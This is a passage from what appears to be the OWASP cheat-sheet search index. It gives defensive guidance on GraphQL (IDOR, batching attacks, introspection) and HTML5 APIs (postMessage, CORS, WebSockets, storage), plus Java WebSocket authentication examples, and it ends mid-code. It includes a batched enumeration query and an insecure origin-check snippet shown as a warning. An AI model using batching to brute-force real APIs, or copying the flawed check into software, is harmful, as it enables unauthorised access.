for a certain picture may include the ID that is actually the primary key in the database for that picture. As with any request, the server must verify that the caller has access to the object they are requesting. But sometimes developers make the mistake of assuming that possession of the object's ID means the caller should have access. Failure to verify the requester's access in this case is called Broken Object Level Authentication , also known as IDOR . It's possible for a GraphQL API to support access to objects using their ID even if that is not intended. Sometimes there are node or nodes or both fields in a query object, and these can be used to access objects directly by ID . You can check whether your schema has these fields by running this on the command-line (assuming that schema.json contains your GraphQL schema): cat schema.json | jq \".data.__schema.types[] | select(.name==\\\"Query\\\") | .fields[] | .name\" | grep node . Removing these fields from the schema should disable the functionality, but you should always apply proper authorization checks to verify the caller has access to the object they are requesting.","title":"General Data Access"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#query-access-data-fetching","text":"As part of a GraphQL API there will be various data fields that can be returned. One thing to consider is if you want different levels of access around these fields. For example, you may only want certain consumers to be able to fetch certain data fields rather than allowing all consumers to be able to retrieve all available fields. This can be done by adding a check in the code to ensure that the requester should be able to read a field they are trying to fetch.","title":"Query Access (Data Fetching)"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#mutation-access-data-manipulation","text":"GraphQL supports mutation, or manipulation of data, in addition to its most common use case of data fetching. If an API implements/allows mutation then there may need to be access controls put in place to restrict which consumers, if any, can modify data through the API. Setups that require mutation access control would include APIs where only read access is intended for requesters or where only certain parties should be able to modify certain fields.","title":"Mutation Access (Data Manipulation)"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#batching-attacks","text":"GraphQL supports batching requests, also known as query batching . This lets callers to either batch multiple queries or batch requests for multiple object instances in a single network call, which allows for what is called a batching attack . This is a form of brute force attack, specific to GraphQL, that usually allows for faster and less detectable exploits. Here is the most common way to do query batching: [ { query : < query 0 > , variables : < variables for query 0 > , }, { query : < query 1 > , variables : < variables for query 1 > , }, { query : < query n > variables : < variables for query n > , } ] And here is an example query of a single batched GraphQL call requesting multiple different instances of the droid object: query { droid ( id : \"2000\" ) { name } second : droid ( id : \"2001\" ) { name } third : droid ( id : \"2002\" ) { name } } In this case it could be used to enumerate every possible droid object that is stored on the server in very few network requests as opposed to a standard REST API where the requester would need to submit a different network request for every different droid ID they want to request. This type of attack can lead to the following issues: Application-level DoS attacks - A high number of queries or object requests in a single network call could cause a database to hang or exhaust other available resources ( e.g. memory, CPU, downstream services). Enumeration of objects on the server, such as users, emails, and user IDs. Brute forcing passwords, 2 factor authentication codes (OTPs), session tokens, or other sensitive values. WAFs, RASPs, IDS/IPS, SIEMs, or other security tooling will likely not detect these attacks since they only appear to be one single request rather than an a massive amount of network traffic. This attack will likely bypass existing rate limits in tools like Nginx or other proxies/gateways since they rely on looking at the raw number of requests.","title":"Batching Attacks"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#mitigating-batching-attacks","text":"In order to mitigate this type of attack you should put limits on incoming requests at the code level so that they can be applied per request. There are 3 main options: Add object request rate limiting in code Prevent batching for sensitive objects Limit the number of queries that can run at one time One option is to create a code-level rate limit on how many objects that callers can request. This means the backend would track how many different object instances the caller has requested, so that they will be blocked after requesting too many objects even if they batch the object requests in a single network call. This replicates a network-level rate limit that a WAF or other tool would do. Another option is to prevent batching for sensitive objects that you don't want to be brute forced, such as usernames, emails, passwords, OTPs, session tokens, etc. This way an attacker is forced to attack the API like a REST API and make a different network call per object instance. This is not supported natively so it will require a custom solution. However once this control is put in place other standard controls will function normally to help prevent any brute forcing. Limiting the number of operations that can be batched and run at once is another option to mitigate GraphQL batching attacks leading to DoS. This is not a silver bullet though and should be used in conjunction with other methods.","title":"Mitigating Batching Attacks"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#secure-configurations","text":"By default, most GraphQL implementations have some insecure default configurations which should be changed: Disable or restrict Introspection and GraphiQL based on your needs; these should only be used for development purposes. Don't return excessive error messages ( e.g. disable stack traces and debug mode).","title":"Secure Configurations"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#introspection-graphiql","text":"Many implementations of GraphQL have Introspection and GraphiQL enabled by default and leave them accessible without requiring authentication. This is problematic because introspection allows the requester to learn all about supported schema and queries (see a real-world example abusing this). Introspection might be how the API owner wants to educate consumers about how to use the API. However, the preferred way to educate consumers about a service is through a separate documentation channel such as a wiki, Git Readme, or readthedocs. The safest and usually easiest approach is to just disable introspection and GraphiQL system-wide. See this page or consult your GraphQL implementation's documentation to learn how to disable introspection altogether. If your implementation does not natively support disabling introspection or if you would like to allow some consumers/roles to have this access you can build a filter in your service to only allow approved consumers to access the introspection system. Keep in mind that even if introspection is disabled, attackers can still guess fields by brute forcing them. Furthermore, GraphQL has a built-in feature to return a hint when a field name that the requester provides is similar (but incorrect) to an existing field ( e.g. request has usr and the response will ask Did you mean \"user?\" ). You should consider disabling this feature to decrease the exposure, but not all implementations of GraphQL support doing so. Shapeshifter is one tool that should be able to do this . Disable Introspection - Java GraphQLSchema schema = GraphQLSchema . newSchema () . query ( StarWarsSchema . queryType ) . fieldVisibility ( NoIntrospectionGraphqlFieldVisibility . NO_INTROSPECTION_FIELD_VISIBILITY ) . build (); Disable Introspection & GraphiQL - JavaScript app . use ( '/graphql' , graphqlHTTP ({ schema : MySessionAwareGraphQLSchema , + validationRules : [ NoIntrospection ] graphiql : process . env . NODE_ENV === 'development' , }));","title":"Introspection + GraphiQL"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#dont-return-excessive-errors","text":"GraphQL APIs in production shouldn't return stack traces or be in debug mode. Doing this is implementation specific, but using middleware is one popular way to have better control over errors the server returns. To disable excessive errors with Apollo Server, either pass debug: false to the Apollo Server constructor or set the NODE_ENV environment variable to 'production' or 'test'. However, if you would like to log the stack trace internally without returning it to the user see here for how to mask and log errors so they are available to the developers but not callers of the API.","title":"Don't Return Excessive Errors"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#other-resources","text":"","title":"Other Resources"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#tools","text":"InQL Scanner - Security scanner for GraphQL. Particularly useful for generating queries and mutations automatically from given schema and them feeding them to scanner. GraphiQL - Schema/object exploration GraphQL Voyager - Schema/object exploration","title":"Tools"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#graphql-security-best-practices-documentation","text":"GraphQL security best practices Protecting GraphQL APIs from security threats - blog post https://nordicapis.com/security-points-to-consider-before-implementing-graphql/ Limiting resource usage to prevent DoS (timeouts, throttling, complexity management, depth limiting, etc.) GraphQL Security Perspectives A developer's security perspective of GraphQL","title":"GraphQL Security Best Practices + Documentation"},{"location":"cheatsheets/GraphQL_Cheat_Sheet.html#more-on-graphql-attacks","text":"Some common GraphQL attacks + attacker mindset Bypassing permissions by smuggling parameters Bug bounty writeup about GraphQL Security talk about Abusing GraphQL Real world attacks against GraphQL in the past Attack examples against GraphQL","title":"More on GraphQL Attacks"},{"location":"cheatsheets/HTML5_Security_Cheat_Sheet.html","text":"HTML5 Security Cheat Sheet \u00b6 Introduction \u00b6 The following cheat sheet serves as a guide for implementing HTML 5 in a secure fashion. Communication APIs \u00b6 Web Messaging \u00b6 Web Messaging (also known as Cross Domain Messaging) provides a means of messaging between documents from different origins in a way that is generally safer than the multiple hacks used in the past to accomplish this task. However, there are still some recommendations to keep in mind: When posting a message, explicitly state the expected origin as the second argument to postMessage rather than * in order to prevent sending the message to an unknown origin after a redirect or some other means of the target window's origin changing. The receiving page should always : Check the origin attribute of the sender to verify the data is originating from the expected location. Perform input validation on the data attribute of the event to ensure that it's in the desired format. Don't assume you have control over the data attribute. A single Cross Site Scripting flaw in the sending page allows an attacker to send messages of any given format. Both pages should only interpret the exchanged messages as data . Never evaluate passed messages as code (e.g. via eval() ) or insert it to a page DOM (e.g. via innerHTML ), as that would create a DOM-based XSS vulnerability. For more information see DOM based XSS Prevention Cheat Sheet . To assign the data value to an element, instead of using a insecure method like element.innerHTML=data; , use the safer option: element.textContent=data; Check the origin properly exactly to match the FQDN(s) you expect. Note that the following code: if(message.origin.indexOf(\".owasp.org\")!=-1) { /* ... */ } is very insecure and will not have the desired behavior as owasp.org.attacker.com will match. If you need to embed external content/untrusted gadgets and allow user-controlled scripts (which is highly discouraged), consider using a JavaScript rewriting framework such as Google Caja or check the information on sandboxed frames . Cross Origin Resource Sharing \u00b6 Validate URLs passed to XMLHttpRequest.open . Current browsers allow these URLs to be cross domain; this behavior can lead to code injection by a remote attacker. Pay extra attention to absolute URLs. Ensure that URLs responding with Access-Control-Allow-Origin: * do not include any sensitive content or information that might aid attacker in further attacks. Use the Access-Control-Allow-Origin header only on chosen URLs that need to be accessed cross-domain. Don't use the header for the whole domain. Allow only selected, trusted domains in the Access-Control-Allow-Origin header. Prefer whitelisting domains over blacklisting or allowing any domain (do not use * wildcard nor blindly return the Origin header content without any checks). Keep in mind that CORS does not prevent the requested data from going to an unauthenticated location. It's still important for the server to perform usual CSRF prevention. While the RFC recommends a pre-flight request with the OPTIONS verb, current implementations might not perform this request, so it's important that \"ordinary\" ( GET and POST ) requests perform any access control necessary. Discard requests received over plain HTTP with HTTPS origins to prevent mixed content bugs. Don't rely only on the Origin header for Access Control checks. Browser always sends this header in CORS requests, but may be spoofed outside the browser. Application-level protocols should be used to protect sensitive data. WebSockets \u00b6 Drop backward compatibility in implemented client/servers and use only protocol versions above hybi-00. Popular Hixie-76 version (hiby-00) and older are outdated and insecure. The recommended version supported in latest versions of all current browsers is RFC 6455 (supported by Firefox 11+, Chrome 16+, Safari 6, Opera 12.50, and IE10). While it's relatively easy to tunnel TCP services through WebSockets (e.g. VNC, FTP), doing so enables access to these tunneled services for the in-browser attacker in case of a Cross Site Scripting attack. These services might also be called directly from a malicious page or program. The protocol doesn't handle authorization and/or authentication. Application-level protocols should handle that separately in case sensitive data is being transferred. Process the messages received by the websocket as data. Don't try to assign it directly to the DOM nor evaluate as code. If the response is JSON, never use the insecure eval() function; use the safe option JSON.parse() instead. Endpoints exposed through the ws:// protocol are easily reversible to plain text. Only wss:// (WebSockets over SSL/TLS) should be used for protection against Man-In-The-Middle attacks. Spoofing the client is possible outside a browser, so the WebSockets server should be able to handle incorrect/malicious input. Always validate input coming from the remote site, as it might have been altered. When implementing servers, check the Origin: header in the Websockets handshake. Though it might be spoofed outside a browser, browsers always add the Origin of the page that initiated the Websockets connection. As a WebSockets client in a browser is accessible through JavaScript calls, all Websockets communication can be spoofed or hijacked through Cross Site Scripting . Always validate data coming through a WebSockets connection. Server-Sent Events \u00b6 Validate URLs passed to the EventSource constructor, even though only same-origin URLs are allowed. As mentioned before, process the messages ( event.data ) as data and never evaluate the content as HTML or script code. Always check the origin attribute of the message ( event.origin ) to ensure the message is coming from a trusted domain. Use a whitelist approach. Storage APIs \u00b6 Local Storage \u00b6 Also known as Offline Storage, Web Storage. Underlying storage mechanism may vary from one user agent to the next. In other words, any authentication your application requires can be bypassed by a user with local privileges to the machine on which the data is stored. Therefore, it's recommended not to store any sensitive information in local storage. Use the object sessionStorage instead of localStorage if persistent storage is not needed. sessionStorage object is available only to that window/tab until the window is closed. A single Cross Site Scripting can be used to steal all the data in these objects, so again it's recommended not to store sensitive information in local storage. A single Cross Site Scripting can be used to load malicious data into these objects too, so don't consider objects in these to be trusted. Pay extra attention to \"localStorage.getItem\" and \"setItem\" calls implemented in HTML5 page. It helps in detecting when developers build solutions that put sensitive information in local storage, which is a bad practice. Do not store session identifiers in local storage as the data is always accessible by JavaScript. Cookies can mitigate this risk using the httpOnly flag. There is no way to restrict the visibility of an object to a specific path like with the attribute path of HTTP Cookies, every object is shared within an origin and protected with the Same Origin Policy. Avoid host multiple applications on the same origin, all of them would share the same localStorage object, use different subdomains instead. Client-side databases \u00b6 On November 2010, the W3C announced Web SQL Database (relational SQL database) as a deprecated specification. A new standard Indexed Database API or IndexedDB (formerly WebSimpleDB) is actively developed, which provides key-value database storage and methods for performing advanced queries. Underlying storage mechanisms may vary from one user agent to the next. In other words, any authentication your application requires can be bypassed by a user with local privileges to the machine on which the data is stored. Therefore, it's recommended not to store any sensitive information in local storage. If utilized, WebDatabase content on the client side can be vulnerable to SQL injection and needs to have proper validation and parameterization. Like Local Storage, a single Cross Site Scripting can be used to load malicious data into a web database as well. Don't consider data in these to be trusted. Geolocation \u00b6 The Geolocation RFC recommends that the user agent ask the user's permission before calculating location. Whether or how this decision is remembered varies from browser to browser. Some user agents require the user to visit the page again in order to turn off the ability to get the user's location without asking, so for privacy reasons, it's recommended to require user input before calling getCurrentPosition or watchPosition . Web Workers \u00b6 Web Workers are allowed to use XMLHttpRequest object to perform in-domain and Cross Origin Resource Sharing requests. See relevant section of this Cheat Sheet to ensure CORS security. While Web Workers don't have access to DOM of the calling page, malicious Web Workers can use excessive CPU for computation, leading to Denial of Service condition or abuse Cross Origin Resource Sharing for further exploitation. Ensure code in all Web Workers scripts is not malevolent. Don't allow creating Web Worker scripts from user supplied input. Validate messages exchanged with a Web Worker. Do not try to exchange snippets of JavaScript for evaluation e.g. via eval() as that could introduce a DOM Based XSS vulnerability. Tabnabbing \u00b6 Attack is described in detail in this article . To summarize, it's the capacity to act on parent page's content or location from a newly opened page via the back link exposed by the opener JavaScript object instance. It applies to an HTML link or a JavaScript window.open function using the attribute/instruction target to specify a target loading location that does not replace the current location and then makes the current window/tab available. To prevent this issue, the following actions are available: Cut the back link between the parent and the child pages: For HTML links: To cut this back link, add the attribute rel=\"noopener\" on the tag used to create the link from the parent page to the child page. This attribute value cuts the link, but depending on the browser, lets referrer information be present in the request to the child page. To also remove the referrer information use this attribute value: rel=\"noopener noreferrer\" . For the JavaScript window.open function, add the values noopener,noreferrer in the windowFeatures parameter of the window.open function. As the behavior using the elements above is different between the browsers, either use an HTML link or JavaScript to open a window (or tab), then use this configuration to maximize the cross supports: For HTML links, add the attribute rel=\"noopener noreferrer\" to every link. For JavaScript, use this function to open a window (or tab): function openPopup ( url , name , windowFeatures ){ //Open the popup and set the opener and referrer policy instruction var newWindow = window . open ( url , name , 'noopener,noreferrer,' + windowFeatures ); //Reset the opener link newWindow . opener = null ; } Add the HTTP response header Referrer-Policy: no-referrer to every HTTP response sent by the application ( Header Referrer-Policy information . This configuration will ensure that no referrer information is sent along with requests from the page. Compatibility matrix: noopener noreferrer referrer-policy Sandboxed frames \u00b6 Use the sandbox attribute of an iframe for untrusted content. The sandbox attribute of an iframe enables restrictions on content within an iframe . The following restrictions are active when the sandbox attribute is set: All markup is treated as being from a unique origin. All forms and scripts are disabled. All links are prevented from targeting other browsing contexts. All features that trigger automatically are blocked. All plugins are disabled. It is possible to have a fine-grained control over iframe capabilities using the value of the sandbox attribute. In old versions of user agents where this feature is not supported, this attribute will be ignored. Use this feature as an additional layer of protection or check if the browser supports sandboxed frames and only show the untrusted content if supported. Apart from this attribute, to prevent Clickjacking attacks and unsolicited framing it is encouraged to use the header X-Frame-Options which supports the deny and same-origin values. Other solutions like framebusting if(window!==window.top) { window.top.location=location;} are not recommended. Credential and Personally Identifiable Information (PII) Input hints \u00b6 Protect the input values from being cached by the browser. Access a financial account from a public computer. Even though one is logged-off, the next person who uses the machine can log-in because the browser autocomplete functionality. To mitigate this, we tell the input fields not to assist in any way. < input type = \"text\" spellcheck = \"false\" autocomplete = \"off\" autocorrect = \"off\" autocapitalize = \"off\" ></ input > Text areas and input fields for PII (name, email, address, phone number) and login credentials (username, password) should be prevented from being stored in the browser. Use these HTML5 attributes to prevent the browser from storing PII from your form: spellcheck=\"false\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" Offline Applications \u00b6 Whether the user agent requests permission from the user to store data for offline browsing and when this cache is deleted, varies from one browser to the next. Cache poisoning is an issue if a user connects through insecure networks, so for privacy reasons it is encouraged to require user input before sending any manifest file. Users should only cache trusted websites and clean the cache after browsing through open or insecure networks. Progressive Enhancements and Graceful Degradation Risks \u00b6 The best practice now is to determine the capabilities that a browser supports and augment with some type of substitute for capabilities that are not directly supported. This may mean an onion-like element, e.g. falling through to a Flash Player if the <video> tag is unsupported, or it may mean additional scripting code from various sources that should be code reviewed. HTTP Headers to enhance security \u00b6 Consult the project OWASP Secure Headers in order to obtains the list of HTTP security headers that an application should use to enable defenses at browser level. WebSocket implementation hints \u00b6 In addition to the elements mentioned above, this is the list of areas for which caution must be taken during the implementation. Access filtering through the \"Origin\" HTTP request header Input / Output validation Authentication Authorization Access token explicit invalidation Confidentiality and Integrity The section below will propose some implementation hints for every area and will go along with an application example showing all the points described. The complete source code of the example application is available here . Access filtering \u00b6 During a websocket channel initiation, the browser sends the Origin HTTP request header that contains the source domain initiation for the request to handshake. Even if this header can be spoofed in a forged HTTP request (not browser based), it cannot be overridden or forced in a browser context. It then represents a good candidate to apply filtering according to an expected value. An example of an attack using this vector, named Cross-Site WebSocket Hijacking (CSWSH) , is described here . The code below defines a configuration that applies filtering based on a \"whitelist\" of origins. This ensures that only allowed origins can establish a full handshake: import org.owasp.encoder.Encode ; import org.slf4j.Logger ; import org.slf4j.LoggerFactory ; import javax.websocket.server.ServerEndpointConfig ; import java.util.Arrays ; import java.util.List ; /** * Setup handshake rules applied to all WebSocket endpoints of the application. * Use to setup the Access Filtering using \"Origin\" HTTP header as input information. * * @see \"http://docs.oracle.com/javaee/7/api/index.html?javax/websocket/server/ * ServerEndpointConfig.Configurator.html\" * @see \"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin\" */ public class EndpointConfigurator extends ServerEndpointConfig . Configurator { /** * Logger */ private static final Logger LOG = LoggerFactory . getLogger ( EndpointConfigurator . class ); /** * Get the expected source origins from a JVM property in order to allow external configuration */ private static final List < String > EXPECTED_ORIGINS = Arrays . asList ( System . getProperty ( \"source.origins\" ) . split ( \";\" )); /** * {@inheritDoc} */ @Override public boolean checkOrigin ( String originHeaderValue ) { boolean isAllowed = EXPECTED_ORIGINS . contains ( originHeaderValue ); String safeOriginValue = Encode . forHtmlContent ( originHeaderValue ); if ( isAllowed ) { LOG . info ( \"[EndpointConfigurator] New handshake request received from {} and was accepted.\" , safeOriginValue ); } else { LOG . warn ( \"[EndpointConfigurator] New handshake request received from {} and was rejected !\" , safeOriginValue ); } return isAllowed ; } } Authentication and Input/Output validation \u00b6 When using websocket as communication channel, it's important to use an authentication method allowing the user to receive an access Token that is not automatically sent by the browser and then must be explicitly sent by the client code during each exchange. JSON Web Token is a good candidate, because it allows the transport of access ticket information in a stateless and not alterable way. Moreover, it defines a validity timeframe. You can find additional information about JWT token hardening on this cheat sheet . JSON Validation Schema are used to define and validate the expected content in input and ouput messages. The code below defines the complete authentication messages flow handling: Authentication Web Socket endpoint - Provide a WS endpoint that enables authentication exchange import org.owasp.pocwebsocket.configurator.EndpointConfigurator ; import org.owasp.pocwebsocket.decoder.AuthenticationRequestDecoder ; import org.owasp.pocwebsocket.encoder.AuthenticationResponseEncoder ; import org.owasp.pocwebsocket.handler.AuthenticationMessageHandler ; import org.slf4j.Logger ; import org.slf4j.LoggerFactory ; import javax.websocket.CloseReason ; import javax.websocket.OnClose ; import javax.websocket.OnError ; import javax.websocket.OnOpen ; import javax.websocket.Session ; import javax.websocket.server.ServerEndpoint ; /** * Class in charge of managing the client authentication. * * @see \"http://docs.oracle.com/javaee/7/api/javax/websocket/server/ServerEndpointConfig.Configurator.html\" * @see \"http://svn.apache.org/viewvc/tomcat/trunk/webapps/examples/WEB-INF/classes/websocket/\" */ @ServerEndpoint ( value = \"/auth\" , configurator = EndpointConfigurator . class , subprotocols = { \"authentication\" }, encoders = { AuthenticationResponseEncoder . class }, decoders = { AuthenticationRequestDecoder . class }) public class AuthenticationEndpoint { /** * Logger */ private static final Logger LOG = LoggerFactory . getLogger ( AuthenticationEndpoint . class ); /** * Handle the beginning of an exchange * * @param session Exchange session information */ @OnOpen public void start ( Session session ) { //Define connection idle timeout and message limits in order to mitigate as much as possible //DOS attacks using massive connection opening or massive big messages sending int msgMaxSize = 1024 * 1024 ; //1 MB session . setMaxIdleTimeout ( 60000 ); //1 minute session . setMaxTextMessageBufferSize ( msgMaxSize ); session . setMaxBinaryMessageBufferSize ( msgMaxSize ); //Log exchange start LOG . info ( \"[AuthenticationEndpoint] Session {} started\" , session . getId ()); //Affect a new message handler instance in order to process the exchange session . addMessageHandler ( new AuthenticationMessageHandler ( session . getBasicRemote ())); LOG . info ( \"[AuthenticationEndpoint] Session {} message handler affected for processing\" , session . getId ()); } /** * Handle error case * * @param session Exchange session information * @param thr Error details */ @OnError public void onError ( Session session , Throwable thr ) { LOG . error ( \"[AuthenticationEndpoint] Error occur in session {}\" , session . getId (), thr ); } /** * Handle close event * * @param session Exchange session information * @param closeReason Exchange closing reason */ @OnClose public void onClose ( Session session , CloseReason closeReason ) { LOG . info ( \"[AuthenticationEndpoint] Session {} closed: {}\" , session . getId (), closeReason . getReasonPhrase ()); } } Authentication message handler - Handle all authentication requests import org.owasp.pocwebsocket.enumeration.AccessLevel ; import org.owasp.pocwebsocket.util.AuthenticationUtils ; import org.owasp.pocwebsocket.vo.AuthenticationRequest ; import org.owasp.pocwebsocket.vo.AuthenticationResponse ; import org.owasp.encoder.Encode ; import org.slf4j.Logger ; import org.slf4j.LoggerFactory ; import javax.websocket.EncodeException ; import javax.websocket.MessageHandler ; import javax.websocket.RemoteEndpoint ; import java.io.IOException ; /** * Handle authentication message flow */ public class AuthenticationMessageHandler implements MessageHandler . Whole < AuthenticationRequest > { private static final Logger LOG = LoggerFactory . getLogger ( AuthenticationMessageHandler . class ); /** * Reference to the communication channel with the client */ private RemoteEndpoint . Basic clientConnection ; /** * Constructor * * @param clientConnection Reference to the communication channel with the client */ public AuthenticationMessageHandler ( RemoteEndpoint . Basic clientConnection ) { this . clientConnection = clientConnection ; } /** * {@inheritDoc} */ @Override public void onMessage ( AuthenticationRequest message ) { AuthenticationResponse response = null ; try { //Authenticate String authenticationToken = \"\" ; String accessLevel = this . authenticate ( message . getLogin (), message . getPassword ()); if ( accessLevel != null ) { //Create a simple JSON token representing the authentication profile authenticationToken = AuthenticationUtils . issueToken ( message . getLogin (), accessLevel ); } //Build the response object String safeLoginValue = Encode . forHtmlContent ( message . getLogin ()); if ( ! authenticationToken . isEmpty ()) { response = new AuthenticationResponse ( true , authenticationToken , \"Authentication succeed !\" ); LOG . info ( \"[AuthenticationMessageHandler] User {} authentication succeed.\" , safeLoginValue ); } else { response = new AuthenticationResponse ( false , authenticationToken , \"Authentication failed !\" ); LOG . warn ( \"[AuthenticationMessageHandler] User {} authentication failed.\" , safeLoginValue ); } } catch ( Exception e ) { LOG . error ( \"[AuthenticationMessageHandler] Error occur in authentication process.\" , e ); //Build the response object indicating that authentication fail response = new AuthenticationResponse ( false , \"\" , \"Authentication failed !\" ); } finally { //Send response try { this . clientConnection . sendObject ( response ); } catch ( IOException | EncodeException e ) { LOG . error ( \"[AuthenticationMessageHandler] Error occur in response object sending.\" , e ); } } } /** * Authenticate the user * * @param login User login * @param password User password * @return The access level if the authentication succeed or NULL if the authentication failed */ private String authenticate ( String login , String password ) { .... } } Utility class to manage JWT token - Handle the issuing and the validation of the access token. Simple JWT token has been used for the example (focus was made here on the global WS endpoint implementation) here without extra hardening (see this cheat sheet to apply extra hardening on the JWT token) import com.auth0.jwt.JWT ; import com.auth0.jwt.JWTVerifier ; import com.auth0.jwt.algorithms.Algorithm ; import com.auth0.jwt.interfaces.DecodedJWT ; import java.io.IOException ; import java.nio.file.Files ; import java.nio.file.Paths ; import java.util.Calendar ; import java.util.Locale ; /** * Utility class to manage the authentication JWT token */ public class AuthenticationUtils { /** * Build a JWT token for a user * * @param login User login * @param accessLevel Access level of the user * @return The Base64 encoded JWT token * @throws Exception If any error occur during the issuing */ public static String issueToken ( String login , String accessLevel ) throws Exception { //Issue a JWT token with validity of 30 minutes Algorithm algorithm = Algorithm . HMAC256 ( loadSecret ()); Calendar c = Calendar . getInstance (); c . add ( Calendar . MINUTE , 30 ); return JWT . create (). withIssuer ( \"WEBSOCKET-SERVER\" ). withSubject ( login ). withExpiresAt ( c . getTime ()) . withClaim ( \"access_level\" , accessLevel . trim (). toUpperCase ( Locale . US )). sign ( algorithm ); } /** * Verify the validity of the provided JWT token * * @param token JWT token encoded to verify * @return The verified and decoded token with user authentication and * authorization (access level) information * @throws Exception If any error occur during the token validation */ public static DecodedJWT validateToken ( String token ) throws Exception { Algorithm algorithm = Algorithm . HMAC256 ( loadSecret ()); JWTVerifier verifier = JWT . require ( algorithm ). withIssuer ( \"WEBSOCKET-SERVER\" ). build (); return verifier . verify ( token ); } /** * Load the JWT secret used to sign token using a byte array for secret storage in order * to avoid persistent string in memory * * @return The secret as byte array * @throws IOException If any error occur during the secret loading */ private static byte [] loadSecret () throws IOException { return Files . readAllBytes ( Paths . get ( \"src\" , \"main\" , \"resources\" , \"jwt-secret.txt\" )); } } JSON schema of the input and output authentication message - Define the expected structure of the input and output messages from the authentication endpoint point of view { \"$schema\" : \"http://json-schema.org/schema#\" , \"title\" : \"AuthenticationRequest\" , \"type\" : \"object\" , \"properties\" : { \"login\" : { \"type\" : \"string\" , \"pattern\" : \"^[a-zA-Z]{1,10}$\" }, \"password\" : { \"type\" : \"string\" } }, \"required\" : [ \"login\" , \"password\" ] } { \"$schema\" : \"http://json-schema.org/schema#\" , \"title\" : \"AuthenticationResponse\" , \"type\" : \"object\" , \"properties\" : { \"isSuccess;\" : { \"type\" : \"boolean\" }, \"token\" : { \"type\" : \"string\" , \"pattern\" : \"^[a-zA-Z0-9+/=\\\\._-]{0,500}$\" }, \"message\" : { \"type\" : \"string\" , \"pattern\" : \"^[a-zA-Z0-9!\\\\s]{0,100}$\" } }, \"required\" : [ \"isSuccess\" , \"token\" , \"message\" ] } Authentication message decoder and encoder - Perform the JSON serialization/deserialization and the input/output validation using dedicated JSON Schema. It makes it possible to systematically ensure that all messages received and sent by the endpoint strictly respect the expected structure and content. import com.fasterxml.jackson.databind.JsonNode ; import com.github.fge.jackson.JsonLoader ; import com.github.fge.jsonschema.core.exceptions.ProcessingException ; import com.github.fge.jsonschema.core.report.ProcessingReport ; import com.github.fge.jsonschema.main.JsonSchema ; import com.github.fge.jsonschema.main.JsonSchemaFactory ; import com.google.gson.Gson ; import org.owasp.pocwebsocket.vo.AuthenticationRequest ; import javax.websocket.DecodeException ; import javax.websocket.Decoder ; import javax.websocket.EndpointConfig ; import java.io.File ; import java.io.IOException ; /** * Decode JSON text representation to an AuthenticationRequest object * <p> * As there's one instance of the decoder class by endpoint session so we can use the * JsonSchema as decoder instance variable. */ public class AuthenticationRequestDecoder implements Decoder . Text < AuthenticationRequest > { /** * JSON validation schema associated to this type of message */ private JsonSchema validationSchema = null ; /** * Initialize decoder and associated JSON validation schema * * @throws IOException If any error occur during the object creation * @throws ProcessingException If any error occur during the schema loading */ public AuthenticationRequestDecoder () throws IOException , ProcessingException { JsonNode node = JsonLoader . fromFile ( new File ( \"src/main/resources/authentication-request-schema.json\" )); this . validationSchema = JsonSchemaFactory . byDefault (). getJsonSchema ( node ); } /** * {@inheritDoc} */ @Override public AuthenticationRequest decode ( String s ) throws DecodeException { try { //Validate the provided representation against the dedicated schema //Use validation mode with report in order to enable further inspection/tracing //of the error details //Moreover the validation method \"validInstance()\" generate a NullPointerException //if the representation do not respect the expected schema //so it's more proper to use the validation method with report ProcessingReport validationReport = this . validationSchema . validate ( JsonLoader . fromString ( s ), true ); //Ensure there no error if ( ! validationReport . isSuccess ()) { //Simply reject the message here: Don't care about error details... throw new DecodeException ( s , \"Validation of the provided representation failed !\" ); } } catch ( IOException | ProcessingException e ) { throw new DecodeException ( s , \"Cannot validate the provided representation to a\" + \" JSON valid representation !\" , e ); } return new Gson (). fromJson ( s , AuthenticationRequest . class ); } /** * {@inheritDoc} */ @Override public boolean willDecode ( String s ) { boolean canDecode = false ; //If the provided JSON representation is empty/null then we indicate that //representation cannot be decoded to our expected object if ( s == null || s . trim (). isEmpty ()) { return canDecode ; } //Try to cast the provided JSON representation to our object to validate at least //the structure (content validation is done during decoding) try { AuthenticationRequest test = new Gson (). fromJson ( s , AuthenticationRequest . class ); canDecode = ( test != null ); } catch ( Exception e ) { //Ignore explicitly any casting error... } return canDecode ; } /** * {@inheritDoc} */ @Override public void init ( EndpointConfig config ) { //Not used } /** * {@inheritDoc} */ @Override public void destroy () { //Not used } } import com.fasterxml.jackson.databind.JsonNode ; import com.github.fge.jackson.JsonLoader ; import com.github.fge.jsonschema.core.exceptions.ProcessingException ; import com.github.fge.jsonschema.core.report.ProcessingReport ; import com.github.fge.jsonschema.main.JsonSchema ; import com.github.fge.jsonschema.main.JsonSchemaFactory ; import com.google.gson.Gson ; import org.owasp.pocwebsocket.vo.AuthenticationResponse ; import javax.websocket.EncodeException ; import javax.websocket.Encoder ; import javax.websocket.EndpointConfig ; import java.io.File ; import java.io.IOException ; /** * Encode AuthenticationResponse object to JSON text representation. * <p> * As there one instance of the encoder class by endpoint session so we can use * the JsonSchema as encoder instance variable. */ public class AuthenticationResponseEncoder implements Encoder . Text < AuthenticationResponse > { /** * JSON validation schema associated to this type of message */ private JsonSchema validationSchema = null ; /** * Initialize encoder and associated JSON validation schema * * @throws IOException If any error occur during the object creation * @throws ProcessingException If any error occur during the schema loading */ public AuthenticationResponseEncoder () throws IOException , ProcessingException { JsonNode node = JsonLoader . fromFile ( new File ( \"src/main/resources/authentication-response-schema.json\" )); this . validationSchema = JsonSchemaFactory . byDefault (). getJsonSchema ( node ); } /** * {@inheritDoc} */ @Override public String encode ( AuthenticationResponse object ) throws EncodeException { //Generate the JSON representation String json = new Gson (). toJson ( object ); try { //Validate the generated representation against the dedicated schema //Use validation mode with report in order to enable further inspection/tracing //of the error details //Moreover the validation method \"validInstance()\" generate a NullPointerException //if the representation do not respect the expected schema //so it's more proper to use the validation method with report ProcessingReport validationReport = this . validationSchema . validate ( JsonLoader . fromString ( json ), 